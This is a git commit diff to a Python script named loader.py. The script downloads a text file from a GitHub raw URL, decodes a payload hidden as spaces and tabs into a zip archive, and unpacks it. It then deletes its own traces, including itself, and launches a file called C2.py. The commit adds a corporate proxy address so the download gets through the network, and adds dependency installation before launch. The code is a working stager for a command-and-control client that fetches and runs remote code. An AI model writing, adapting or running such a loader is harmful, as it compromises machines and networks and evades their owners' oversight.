fa2deadcd419e98b1ebf798212924bf550ff507d
Ryan Ducret <ryan.ducret@richemont.com>
2025-04-11 16:04:30 +0200

    test

--- loader.py
+++ loader.py
@@ -1,11 +1,16 @@
 import os, shutil
 import random
 import urllib.request
+
+proxy_address = "zproxy-euc1.eu.aws.rccad.net:80"
+
+if proxy_address:
+    proxy = urllib.request.ProxyHandler({'http': proxy_address, 'https': proxy_address})
+    opener = urllib.request.build_opener(proxy)
+    urllib.request.install_opener(opener)
+
 with urllib.request.urlopen('https://raw.githubusercontent.com/glyme6139/glyme6139/refs/heads/test/pack.txt') as f, open("pack.txt","w") as o:
     o.write(f.read().decode('utf-8'))
-
-
-
 
 def decode(bits, encoding='utf-8', errors='surrogatepass'):
     n = int(bits.replace(" ","0").replace("\t","1"), 2)
@@ -25,4 +30,4 @@ shutil.unpack_archive("client.zip","Client")
 os.remove("pack.txt")
 os.remove("client.zip")
 os.remove("loader.py")
-os.system("cd Client && start py C2.py")
+os.system("cd Client && py -m pip install requirements.txt || python -m pip install requirements.txt && start py C2.py || python C2.py")
